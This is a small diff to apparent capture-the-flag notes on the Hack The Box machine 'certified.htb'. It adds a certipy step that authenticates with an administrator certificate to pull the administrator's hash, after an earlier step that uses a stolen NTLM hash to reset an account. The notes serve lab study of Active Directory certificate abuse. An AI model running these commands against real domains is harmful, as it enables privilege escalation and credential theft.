@@ -22,3 +22,4 @@ When I use this certificate, Windows is nice enough to assume that domain is itâ
 
 3. set your account back to what it was == certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41 
 
+4. lastly, use the acquired template to get a hash for the administrator == certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
